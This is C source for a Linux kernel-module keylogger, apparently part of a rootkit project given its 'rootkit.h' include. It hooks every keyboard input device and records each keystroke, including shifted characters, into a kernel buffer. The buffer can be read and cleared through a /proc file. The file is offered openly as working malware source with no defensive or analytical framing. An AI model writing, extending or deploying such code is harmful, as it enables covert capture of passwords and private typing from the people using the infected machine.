// Keylogger for Linux kernel
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/bitops.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include "rootkit.h"

#define SUCCESS 0

static bool keylogger_initialized = false;
static struct input_handler kb_input_handler;
static bool shift_pressed = false;

static char keylog_buffer[MAX_KEYLOG_SIZE];
static size_t keylog_index = 0;
static DEFINE_SPINLOCK(keylog_lock);

// /proc/keylog
static int keylog_proc_show(struct seq_file *m, void *v)
{
    unsigned long flags;
    spin_lock_irqsave(&keylog_lock, flags);
    seq_write(m, keylog_buffer, keylog_index);
    keylog_index = 0;  // Clear after read
    spin_unlock_irqrestore(&keylog_lock, flags);
    return 0;
}

static int keylog_proc_open(struct inode *inode, struct file *file)
{
    return single_open(file, keylog_proc_show, NULL);
}

static const struct proc_ops keylog_proc_ops = {
    .proc_open    = keylog_proc_open,
    .proc_read    = seq_read,
    .proc_lseek   = seq_lseek,
    .proc_release = single_release,
};

// A check if it's a keyboard
static bool is_keyboard(struct input_dev *dev) {
    return test_bit(EV_KEY, dev->evbit) &&
           test_bit(KEY_A, dev->keybit) &&
           test_bit(KEY_Z, dev->keybit) &&
           test_bit(KEY_ENTER, dev->keybit);
}

static const char *keymap[] = {
    [KEY_RESERVED] = "", [KEY_ESC] = "⎋", [KEY_1] = "1", [KEY_2] = "2",
    [KEY_3] = "3", [KEY_4] = "4", [KEY_5] = "5", [KEY_6] = "6",
    [KEY_7] = "7", [KEY_8] = "8", [KEY_9] = "9", [KEY_0] = "0",
    [KEY_MINUS] = "-", [KEY_EQUAL] = "=", [KEY_BACKSPACE] = "[BACKSPACE]", [KEY_TAB] = "[TAB]",
    [KEY_Q] = "q", [KEY_W] = "w", [KEY_E] = "e", [KEY_R] = "r",
    [KEY_T] = "t", [KEY_Y] = "y", [KEY_U] = "u", [KEY_I] = "i",
    [KEY_O] = "o", [KEY_P] = "p", [KEY_LEFTBRACE] = "[", [KEY_RIGHTBRACE] = "]",
    [KEY_ENTER] = "[ENTER]", [KEY_LEFTCTRL] = "^C", [KEY_A] = "a", [KEY_S] = "s",
    [KEY_D] = "d", [KEY_F] = "f", [KEY_G] = "g", [KEY_H] = "h",
    [KEY_J] = "j", [KEY_K] = "k", [KEY_L] = "l", [KEY_SEMICOLON] = ";",
    [KEY_APOSTROPHE] = "'", [KEY_GRAVE] = "`", [KEY_LEFTSHIFT] = "[SHIFT]", 
    [KEY_BACKSLASH] = "\\", [KEY_Z] = "z", [KEY_X] = "x", [KEY_C] = "c",
    [KEY_V] = "v", [KEY_B] = "b", [KEY_N] = "n", [KEY_M] = "m",
    [KEY_COMMA] = ",", [KEY_DOT] = ".", [KEY_SLASH] = "/", [KEY_RIGHTSHIFT] = "[SHIFT]",
    [KEY_SPACE] = "[SPACE]", [KEY_LEFTCTRL] = "[CTRL]", [KEY_RIGHTCTRL] = "[CTRL]"
};

static const char *keymap_shift[] = {
    [KEY_1] = "!", [KEY_2] = "@", [KEY_3] = "#", [KEY_4] = "$",
    [KEY_5] = "%", [KEY_6] = "^", [KEY_7] = "&", [KEY_8] = "*",
    [KEY_9] = "(", [KEY_0] = ")", [KEY_MINUS] = "_", [KEY_EQUAL] = "+",
    [KEY_Q] = "Q", [KEY_W] = "W", [KEY_E] = "E", [KEY_R] = "R",
    [KEY_T] = "T", [KEY_Y] = "Y", [KEY_U] = "U", [KEY_I] = "I",
    [KEY_O] = "O", [KEY_P] = "P", [KEY_LEFTBRACE] = "{", [KEY_RIGHTBRACE] = "}",
    [KEY_A] = "A", [KEY_S] = "S", [KEY_D] = "D", [KEY_F] = "F",
    [KEY_G] = "G", [KEY_H] = "H", [KEY_J] = "J", [KEY_K] = "K",
    [KEY_L] = "L", [KEY_SEMICOLON] = ":", [KEY_APOSTROPHE] = "\"", [KEY_GRAVE] = "~",
    [KEY_BACKSLASH] = "|", [KEY_Z] = "Z", [KEY_X] = "X", [KEY_C] = "C",
    [KEY_V] = "V", [KEY_B] = "B", [KEY_N] = "N", [KEY_M] = "M",
    [KEY_COMMA] = "<", [KEY_DOT] = ">", [KEY_SLASH] = "?"
};

static void keylogger_event(struct input_handle *handle, unsigned int type,
                            unsigned int code, int value)
{
    if (type != EV_KEY) return;

    if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT) {
        shift_pressed = (value == 1 || value == 2);
        return;
    }

    if (value == 1) { // Key press only
        const char *ch = NULL;
        if (shift_pressed && keymap_shift[code])
            ch = keymap_shift[code];
        else if (keymap[code])
            ch = keymap[code];

        if (ch) {
            struct task_struct *task = current;
            pid_t pid = task->pid;
            const char *name = task->comm;
        
            DBG_PRINT("[Keylogger][Key][%d] %s pressed: %s\n", pid, name, ch);
            if (ch) {
                if (!strcmp(ch, "[ENTER]"))
                    ch = "\n";
                else if (!strcmp(ch, "[TAB]"))
                    ch = "\t";
                else if (!strcmp(ch, "[SPACE]"))
                    ch = " ";
                else if (!strcmp(ch, "[BACKSPACE]")) {
                    ch = "\b";
                } else if (ch[0] == '[') {
                    // Skip modifiers like [SHIFT], [CTRL], etc.
                    return;
                }
            }
            unsigned long flags;
            spin_lock_irqsave(&keylog_lock, flags);
            // keylog_index += scnprintf(keylog_buffer + keylog_index,
            //                            MAX_KEYLOG_SIZE - keylog_index,
            //                            "[%d] %s: %s\n", pid, name, ch);
            keylog_index += scnprintf(keylog_buffer + keylog_index,
                MAX_KEYLOG_SIZE - keylog_index, "%s", ch); // Without PID and name to make the log more compact
        if (keylog_index >= MAX_KEYLOG_SIZE)
                keylog_index = 0;  // Optional: wrap or reset
            spin_unlock_irqrestore(&keylog_lock, flags);
        }
    }
}

static int keylogger_connect(struct input_handler *handler,
                             struct input_dev *dev,
                             const struct input_device_id *id)
{
    if (!is_keyboard(dev))
    {
        // DBG_PRINT("Keylogger: Not a keyboard device: %s\n", dev->name);
        return -ENODEV; // Not a keyboard
    }

    struct input_handle *handle;
    int err;

    handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
    if (!handle)
        return -ENOMEM;

    handle->dev = dev;
    handle->handler = handler;
    handle->name = "keylogger_handle";

    err = input_register_handle(handle);
    if (err)
        goto err_free;

    err = input_open_device(handle);
    if (err)
        goto err_unregister;

    DBG_PRINT("[Keylogger] Keylogger connected to %s\n", dev->name);
    return SUCCESS;

err_unregister:
    input_unregister_handle(handle);
err_free:
    kfree(handle);
    return err;
}

static void keylogger_disconnect(struct input_handle *handle)
{
    DBG_PRINT("[Keylogger] device disconnected\n");
    input_close_device(handle);
    input_unregister_handle(handle);
    kfree(handle);
}

static const struct input_device_id kb_ids[] = {
    { .flags = INPUT_DEVICE_ID_MATCH_EVBIT,
      .evbit = { BIT_MASK(EV_KEY) }, },
    { }, // Terminate
};

static struct input_handler kb_input_handler = {
    .event     = keylogger_event,
    .connect   = keylogger_connect,
    .disconnect = keylogger_disconnect,
    .name      = "kb_input_handler",
    .id_table  = kb_ids,
};

int keylogger_init(void)
{
    if (keylogger_initialized)
    {
        DBG_PRINT("[Keylogger] Keylogger already initialized\n");
        return SUCCESS;
    }
    struct proc_dir_entry *entry;
    entry = proc_create(PROC_FILE, 0400, NULL, &keylog_proc_ops);
    if (!entry) {
        DBG_PRINT("[Keylogger] Failed to create /proc/keylog\n");
        return -ENOMEM;
    }
    int ret = input_register_handler(&kb_input_handler);
    if (ret)
        return ret;

    keylogger_initialized = true;
    DBG_PRINT("[Keylogger] Keylogger initialized\n");
    return SUCCESS;
}

void keylogger_cleanup(void)
{
    if (keylogger_initialized)
    {
        remove_proc_entry(PROC_FILE, NULL);
        input_unregister_handler(&kb_input_handler);
        DBG_PRINT("[Keylogger] Keylogger unloaded\n");
    }
    keylogger_initialized = false;
}
